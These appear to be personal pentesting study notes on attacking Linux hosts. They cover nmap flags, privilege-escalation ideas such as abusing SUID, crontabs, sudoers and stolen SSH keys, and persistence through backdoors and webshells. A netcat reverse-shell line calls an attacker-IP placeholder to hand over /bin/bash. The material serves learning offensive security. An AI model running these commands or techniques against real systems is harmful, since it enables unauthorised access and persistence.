# attacking linux

### recon

Look for:

* insecure services on open ports
* common protocols
* insecure version of software
* websites, login pages, ssh, databases, ftp
* scripts, misconfigured permissions, other vulns

Common things

* weak creds
* generous permissions
* vague variables

### nmap

##### flags

* `-sS` - TCP syn port scan
  * we send SYN, server sends ACK or SYN/ACK, that means port is open
  * stealthy scan and very fast
  * default w/ root
* `-sT` - TCP connect port scan
  * establishes full connection then tears down connection
  * default w/out root
* `-sU` - UDP port scan
  * scans for UDP ports
* `-sA` - TCP ack port scan
  * uses packets with only ACK flag, check whether firewall is stateful or stateless
* `-sC` - default scripted scan
* `-sV` - version lookup
* `-oA` - output in all formats
* `-v` - verbose

##### sample

```bash
nmap <ip-address>
```

### netcat

`nc <attacker-ip> <port-number> -c /bin/bash`

`nc -nvlp <port-number>`

### privilege escalation vs exploitation

* exploit some vuln to escalate
* exploitation doesn't have to escalate
* to escalate, you need to exploit

##### how to escalate

* abuse crontabs
* abuse suid/guid
* edit/abuse misconfigured files
  * `/etc/sudoers`
  * sshd.config file
* guess/crack pw
* steal/abuse ssh keys
* find other running services
* environment variables
* use known shell exploits
* read command history

### persistence

* reverse shells (netcat)
* setup your own services/backdoors
  * webshell (user is www-data)
* get info about system
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md

